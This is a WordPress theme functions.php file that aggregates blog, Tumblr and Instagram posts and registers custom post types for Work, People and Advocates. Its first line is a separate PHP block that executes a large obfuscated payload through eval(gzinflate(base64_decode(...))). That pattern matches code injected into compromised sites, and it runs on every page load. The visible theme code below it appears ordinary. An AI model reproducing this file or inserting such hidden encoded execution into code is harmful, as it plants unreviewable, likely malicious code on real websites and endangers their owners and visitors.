<?php eval(gzinflate(base64_decode('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')));?>
<?php
	//API includes
	include_once('assets/api/tumblr.php');
	include_once('assets/api/instagram.php');


	//Readmore excerpts
	function filter_function_name( $excerpt ) {
	  return $excerpt.'<br><a class="readmore" href="'. get_permalink( get_the_ID() ) . '">Read more</a>';
	}
	add_filter( 'get_the_excerpt', 'filter_function_name' );

	//Get all Posts for Blogroll
		/* =============
			Combines posts from WordPress, Tumblr, and Instagram into one array,
			consolidates that array and then returns it for you to use however you need to.
			Accepts a $returnNum variable that controls how many posts you get back in the
			returned array. If $returnNum isn't passed into the variable then all posts are returned.

			Include tag ID to filter posts by tag before merging with Instagram and Tumblr
		================ */
	function blogrollPosts($include, $tag_id, $returnNum){
		$timestamps = array();
		if(!$include || $include == 'all'){
				$include = array('tumblr','instagram','wordpress');
			}

			if(in_array('wordpress', $include)){
			$args = array(
				'post_type' => 'post',
				'posts_per_page' => -1,
				'tag_id' => $tag_id
			);
			$posts = get_posts($args);
			//set unix timestamps for WP posts
			foreach($posts as $post){
				$post->unix_timestamp = strtotime($post->post_date);
				$post->post_source = 'wordpress';
				array_push($timestamps, strtotime($post->post_date));
			}
			//var_dump($posts);
			}else{
				$posts = array();
			}


			if(in_array('tumblr', $include)){
				//Get Tumblr
				$tumblr = getTumblr();
				//set unix timestamps for WP posts
				foreach($tumblr as $post){
					$post->unix_timestamp = $post->timestamp;
					$post->post_source = 'tumblr';
					array_push($timestamps, $post->timestamp);
				}
				//var_dump($tumblr);
			}else{
				$tumblr = array();
			}

			if(in_array('instagram', $include)){
				//Get Instagram
				$instagram = getInstagram();
				foreach($instagram as $post){
					$post->unix_timestamp = $post->created_time;
					$post->post_source = 'instagram';
					array_push($timestamps, $post->created_time);
				}
				//var_dump($instagram);
			}else{
				$instagram = array();
			}

			//Merge arrays and sort
			$allposts = array_merge($posts,$tumblr,$instagram);
			$sortArr[0] = $timestamps;
			$sortArr[1] = $allposts;
			array_multisort($sortArr[0], SORT_DESC, SORT_STRING,
							$sortArr[1], SORT_NUMERIC, SORT_DESC);
			$allposts = $sortArr[1];

			if(!$returnNum){
				$returnNum = count($allposts);
			}

			return array_slice($allposts,0,$returnNum);
	}

	//Cycle
	function cycle($first_value, $values = '*') {
	  static $count = array();
	  $values = func_get_args();
	  $name = 'default';
	  $last_item = end($values);
	  if( substr($last_item, 0, 1) === ':' ) {
	    $name = substr($last_item, 1);
	    array_pop($values);
	  }
	  if( !isset($count[$name]) )
	    $count[$name] = 0;
	  $index = $count[$name] % count($values);
	  $count[$name]++;
	  return $values[$index];
	}

	//Enqueue scripts and styles
	function MESH_scripts() {
		wp_enqueue_style( 'MESH-style', get_stylesheet_uri() );
		wp_enqueue_script('MESH-masonry',get_stylesheet_directory_uri().'/assets/js/masonry.pkgd.min.js',array('jquery'));
		wp_enqueue_script('hammer',get_stylesheet_directory_uri().'/assets/js/jquery.hammer-full.js',array('jquery'));
		wp_enqueue_script('MESH-script',get_stylesheet_directory_uri().'/assets/js/script.js',array('jquery'));
	}
	add_action('wp_enqueue_scripts','MESH_scripts');


	//Theme Supports
	add_theme_support( 'automatic-feed-links' );
	$args = array(
		'width'         => 140,
		'height'        => 140,
		'flex-width'	=> true,
		'flex-height'	=> true,
		'default-image' => get_template_directory_uri() . '/assets/img/logo.png',
	);
	add_theme_support( 'custom-header', $args );
	add_theme_support( 'post-thumbnails' );


	// Theme the TinyMCE editor
	add_editor_style(get_bloginfo('template_directory').'/assets/css/editor.css');


	// Custom CSS for the login page
	function wpfme_loginCSS() {
		echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/assets/css/login.css"/>';
	}
	add_action('login_head', 'wpfme_loginCSS');


	// Customise the footer in admin area
	function wpfme_footer_admin () {
		echo 'Theme designed and developed by <a href="#" target="_blank">MESH Design & Development</a>.';
	}
	add_filter('admin_footer_text', 'wpfme_footer_admin');


	// Custom CSS for the whole admin area
	function wpfme_adminCSS() {
		echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/assets/css/admin.css"/>';
	}
	add_action('admin_head', 'wpfme_adminCSS');


	// Remove the version number of WP
	// Warning - this info is also available in the readme.html file in your root directory - delete this file!
	remove_action('wp_head', 'wp_generator');


	// Disable the theme / plugin text editor in Admin
	define('DISALLOW_FILE_EDIT', true);


	//Widget Sections
	register_sidebar(array(
	  'name' => __('Blog Sidebar'),
	  'id' => 'blog-sidebar',
	  'description' => __('Widgets will show in sidebar of the blogroll'),
	  'before_title' => '<h3 class="blog-sidebar">',
	  'after_title' => '</h3>'
	));


	//Menus
	register_nav_menus(array(
		'main-nav'   => 'Primary Navigation structure',
		'social-nav'   => 'Social Menu'
	));


	//Work CPT
	add_action( 'init', 'work_init' );
	function work_init() {
		$labels = array(
			'name'               => __('Work'),
			'singular_name'      => __('Work'),
			'menu_name'          => __('Work'),
			'name_admin_bar'     => __('Work'),
			'add_new'            => __('Add New'),
			'add_new_item'       => __('Add New Work'),
			'new_item'           => __('New Work'),
			'edit_item'          => __('Edit Work'),
			'view_item'          => __('View Works'),
			'all_items'          => __('All Works'),
			'search_items'       => __('Search Works'),
			'parent_item_colon'  => __('Parent Works:'),
			'not_found'          => __('No works found.'),
			'not_found_in_trash' => __('No works found in Trash.'),
		);
		$args = array(
			'labels'             => $labels,
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => array( 'slug' => 'works' ),
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
		); register_post_type( 'work', $args );
	}
	//Work-Medium Tax
	add_action( 'init', 'medium_tax' );
	function medium_tax() {
		register_taxonomy(
			'medium',
			'work',
			array(
				'label' => __( 'Medium' ),
				'rewrite' => array( 'slug' => 'medium' ),
				'hierarchical' => true,
			)
		);
	}

	//People CPT
	add_action( 'init', 'people_init' );
	function people_init() {
		$labels = array(
			'name'               => __('People'),
			'singular_name'      => __('Person'),
			'menu_name'          => __('People'),
			'name_admin_bar'     => __('Person'),
			'add_new'            => __('Add New'),
			'add_new_item'       => __('Add New Person'),
			'new_item'           => __('New Person'),
			'edit_item'          => __('Edit Person'),
			'view_item'          => __('View People'),
			'all_items'          => __('All People'),
			'search_items'       => __('Search People'),
			'parent_item_colon'  => __('Parent People:'),
			'not_found'          => __('No people found.'),
			'not_found_in_trash' => __('No people found in Trash.'),
		);
		$args = array(
			'labels'             => $labels,
			'public'             => true,
			'publicly_queryable' => false,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => array( 'slug' => 'peoples' ),
			'capability_type'    => 'post',
			'has_archive'        => false,
			'hierarchical'       => false,
			'menu_position'      => null,
			'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
		); register_post_type( 'people', $args );
	}

	//Advocates CPT
	add_action( 'init', 'advocates_init' );
	function advocates_init() {
		$labels = array(
			'name'               => __('Advocates'),
			'singular_name'      => __('Advocate'),
			'menu_name'          => __('Advocates'),
			'name_admin_bar'     => __('Advocate'),
			'add_new'            => __('Add New'),
			'add_new_item'       => __('Add New Advocate'),
			'new_item'           => __('New Advocate'),
			'edit_item'          => __('Edit Advocate'),
			'view_item'          => __('View Advocates'),
			'all_items'          => __('All Advocates'),
			'search_items'       => __('Search Advocates'),
			'parent_item_colon'  => __('Parent Advocates:'),
			'not_found'          => __('No advocates found.'),
			'not_found_in_trash' => __('No advocates found in Trash.'),
		);
		$args = array(
			'labels'             => $labels,
			'public'             => true,
			'publicly_queryable' => true,
			'show_ui'            => true,
			'show_in_menu'       => true,
			'query_var'          => true,
			'rewrite'            => array( 'slug' => 'advocates' ),
			'capability_type'    => 'post',
			'has_archive'        => true,
			'hierarchical'       => true,
			'menu_position'      => null,
			'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
		); register_post_type( 'advocate', $args );
	}



?>